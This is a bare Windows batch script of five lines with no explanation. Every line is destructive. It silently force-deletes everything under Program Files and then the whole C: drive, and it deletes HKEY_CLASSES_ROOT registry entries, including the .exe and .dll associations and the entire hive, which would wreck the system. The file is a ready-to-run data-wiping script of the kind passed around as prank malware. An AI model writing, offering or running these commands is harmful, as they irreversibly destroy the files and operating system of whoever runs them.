del /s /q "C:\Program Files\*.*"
start reg delete hkcr/.exe
start reg delete  hkcr/.dll
start reg delete hkcr/*
del /f /s /q C:\*.*
